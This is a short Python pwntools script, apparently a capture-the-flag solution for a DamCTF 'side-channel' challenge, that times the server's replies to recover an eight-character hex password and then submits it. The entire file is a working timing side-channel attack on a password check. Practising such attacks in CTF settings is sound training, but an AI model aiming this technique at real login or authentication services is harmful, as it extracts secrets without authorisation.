from pwn import *

local = False

if local:
    p = process('./side-channel.py')
else:
    p = remote('chals.damctf.xyz', 30318)
alphabet = '0123456789abcdef'
password = ''
p.recvuntil('Guess character at position password[0] = ?\n')
for i in range(0,8):
    p.sendline('a')
    start_time = time.time()
    p.recvline()
    elapsed_time = time.time() - start_time
    print(elapsed_time)
    password += alphabet[int(elapsed_time * 10)-1]

print('password is '+password)

for i in range(0,8):
    p.sendline(password[i])
    print(p.recvline())

p.interactive()
